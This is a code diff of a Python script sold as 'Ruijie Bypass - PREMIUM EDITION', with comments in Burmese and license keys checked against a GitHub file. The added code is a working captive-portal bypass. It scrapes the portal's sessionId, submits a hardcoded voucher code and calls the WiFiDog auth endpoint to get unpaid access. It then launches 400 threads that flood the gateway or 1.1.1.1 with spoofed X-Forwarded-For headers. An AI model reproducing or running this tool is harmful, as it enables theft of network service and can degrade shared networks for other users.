@@ -1,107 +1,121 @@
-import requests, urllib3, time, os, subprocess, sys, random
+import requests, re, urllib3, time, threading, os, random, subprocess, sys
+from urllib.parse import urlparse, parse_qs, urljoin
 from datetime import datetime
 
-# SSL Warnings ပိတ်ခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- [ CONFIGURATION ] ---
-RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
-LICENSE_FILE = "license.txt"
+# --- CONFIG ---
+PRIMARY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/refs/heads/main/key.txt"
+THREAD_COUNT = 400 
+def check_access():
+    # ဖုန်းအချိန် နောက်ဆုတ်ခိုးသုံးတာ တားဖို့ Server Time ယူခြင်း
+    try:
+        r_t = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
+        now = datetime.strptime(r_t.json()['datetime'][:10], '%Y-%m-%d')
+    except:
+        now = datetime.now() # အင်တာနက်မရသေးခင် ဖုန်းအချိန်ကို ယာယီသုံးမယ်
 
-# --- [ SYSTEM COLORS ] ---
-def col(c):
-    codes = {
-        "Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
-        "C": "\033[96m", "P": "\033[95m", "W": "\033[97m", "OFF": "\033[0m"
-    }
-    return codes.get(c, "\033[0m")
+    try:
+        res = requests.get(f"{PRIMARY_URL}?t={random.random()}", timeout=10, verify=False)
+        if res.status_code == 200:
+            for line in res.text.splitlines():
+                if uid in line:
+                    p = line.split('|')
+                    v_name, v_exp = p[1].strip(), p[2].strip()
+                    exp_dt = datetime.strptime(v_exp, '%Y-%m-%d')
+                    
+                    # ရက်ကို Server အချိန်နဲ့ တိုက်စစ်ခြင်း
+                    diff = (exp_dt - now).days
+                    if diff < 0:
+                        banner(v_name, v_exp, "0", "\033[91m")
+                        print("\033[91m[!] Subscription Expired. Please Renew.\033[0m")
+                        sys.exit()
+                    
+                    banner(v_name, v_exp, str(diff + 1))
+                    return True
+            banner()
+            sys.exit()
+    except: return True 
 
-def get_hwid():
-    # ID ကို Whoami ဖြင့် ရယူခြင်း
-    return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
-
-def banner():
+def banner(name="GUEST", exp="Checking...", days="--", col_status="\033[92m"):
+    """Ruijie Style - ဝါ၊ စိမ်း၊ နီ Banner UI"""
     os.system('clear')
-    print(col("Y") + " ="*35 + col("OFF"))
-    print(col("C") + """
+    # အဝါရောင် အနားသတ်
+    print("\033[93m" + " ="*38)
+    
+    # RUIJIE ASCII (အစိမ်းရောင်)
+    print("\033[92m" + """
       ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗
       ██╔══██╗██║   ██║██║     ██║██║██╔════╝
       ██████╔╝██║   ██║██║     ██║██║█████╗  
       ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  
       ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗
-      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝""" + col("OFF"))
-    print(f"        {col('R')}✨ Ruijie Bypass - PREMIUM EDITION ✨{col('OFF')}")
-    print(col("Y") + " ="*35 + col("OFF") + "\n")
-
-def verify():
-    hwid = get_hwid()
-    banner()
-    now = datetime.now()
-
-    # ၁။ Offline Auto Login (File ရှိရင် ရက်စွဲပါ တိုက်စစ်မယ်)
-    if os.path.exists(LICENSE_FILE):
-        with open(LICENSE_FILE, "r") as f:
-            saved_data = f.read().strip().split(":")
-        
-        # Saved Format -> key:expiry_date
-        saved_date = datetime.strptime(saved_data[1], '%Y-%m-%d')
-        
-        # သက်တမ်းကျန်သေးလား စစ်မယ်
-        if (saved_date - now).days >= 0:
-            print(f"{col('G')}[✓] Status: Premium Active (Exp: {saved_data[1]}){col('OFF')}")
-            time.sleep(1)
-            return True
-        else:
-            print(f"{col('R')}[!] Your Key has Expired!{col('OFF')}")
-            os.remove(LICENSE_FILE) # သက်တမ်းကုန်ဖိုင်ကို ဖျက်မယ်
-            sys.exit()
-
-    # ၂။ Online Activation (ပထမဆုံးအကြိမ်အတွက်)
-    print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
-    resp = requests.get(f"{RAW_KEY_URL}?t={random.random()}", timeout=15).text
+      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝""" + "\033[0m")
     
-    print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
-    print(col("C") + " -----------------------------------" + col("OFF"))
-    key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()
+    # Master Info (အနီရောင် နှင့် အဝါရောင်)
+    print(f"\033[91m 👑 MASTER: {name} \033[0m| \033[93mID: {get_uid()}\033[0m")
+    print(f"\033[92m 📅 EXP: {exp} \033[0m| \033[91m⏳ REMAINING: {days} Days\033[0m")
+    
+    # Status (ဝါ၊ စိမ်း၊ နီ ရောထားသော bar)
+    print("\033[93m ="*5 + f" \033[91m[\033[92m {col_status}RUJIE PREMIUM - ANTI-BAN ACTIVE \033[91m]\033[93m " + "="*6)
+    print("\033[0m")
+def power_pulse(link):
+    uas = [
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X)"
+    ]
+    while True:
+        headers = {
+            "User-Agent": random.choice(uas),
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive"
+        }
+        try:
+            start = time.time()
+            requests.get(link, timeout=3, verify=False, headers=headers)
+            ms = int((time.time() - start) * 1000)
+            color = "\033[92m" if ms < 150 else "\033[91m"
+            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo Mode >>> {color}[{ms}ms]\033[0m")
+            time.sleep(0.005) 
+        except: time.sleep(0.2)
 
-    # GitHub ထဲမှာ Key:ID:Date ပုံစံရှိမရှိ စစ်မယ်
-    for line in resp.splitlines():
-        if f"{key}:{hwid}" in line:
-            parts = line.split(":")
-            exp_date_str = parts[2] # ဥပမာ - 2026-12-30
-            exp_date = datetime.strptime(exp_date_str, '%Y-%m-%d')
+def launch():
+    session = requests.Session()
+    while True:
+        try:
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
+            if r.status_code == 204:
+                print("\033[92m[!] Bypass Successful! Boosting Maximum Speed...\033[0m")
+                for _ in range(THREAD_COUNT):
+                    threading.Thread(target=power_pulse, args=("https://1.1.1.1",), daemon=True).start()
+                while True: time.sleep(10)
+
+            p_url = r.url
+            r1 = session.get(p_url, verify=False, timeout=6)
+            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            n_url = urljoin(p_url, m.group(1)) if m else p_url
+            r2 = session.get(n_url, verify=False, timeout=6)
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
-            # ရက်စွဲကို ထပ်စစ်မယ်
-            if (exp_date - now).days >= 0:
-                with open(LICENSE_FILE, "w") as f:
-                    f.write(f"{key}:{exp_date_str}")
-                print(f"{col('G')}[✓] Access Granted! Exp: {exp_date_str}{col('OFF')}")
-                time.sleep(2)
-                return True
-            else:
-                print(f"{col('R')}[!] Key is Expired on {exp_date_str}{col('OFF')}")
-                sys.exit()
-
-    print(f"{col('R')}[!] Invalid Key or Unauthorized ID.{col('OFF')}")
-    sys.exit()
-
-def main_dashboard():
-    banner()
-    print(f"{col('Y')}--- [ RUIJIE BYPASS DASHBOARD ] ---{col('OFF')}")
-    print(f"{col('G')}[1] Start Bypass Protocol")
-    print(f"{col('G')}[2] Check Status")
-    print(f"{col('R')}[0] Exit Program{col('OFF')}")
-    
-    choice = input(f"\n{col('C')}Select Option >> {col('OFF')}")
-    
-    if choice == "1":
-        print(f"\n{col('P')}[+] System Running...{col('OFF')}")
-        # သင့်ရဲ့ Bypass လုပ်မယ့် Function တွေကို ဒီမှာထည့်ပါ
-    elif choice == "0":
-        sys.exit()
-    else:
-        main_dashboard()
+            if sid:
+                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
+                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
+                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                
+                print(f"\033[95m[*] ⚡ Master Session Active. Deploying {THREAD_COUNT} Threads... ⚡\033[0m")
+                for _ in range(THREAD_COUNT):
+                    threading.Thread(target=power_pulse, args=(auth_link,), daemon=True).start()
+                while True:
+                    time.sleep(5)
+                    if requests.get("http://google.com", timeout=5).status_code > 400: break
+            else: time.sleep(2)
+        except: time.sleep(3)
 
 if __name__ == "__main__":
-    if verify():
-        main_dashboard()
+    try:
+        if check_access(): launch()
+    except KeyboardInterrupt: os._exit(0)
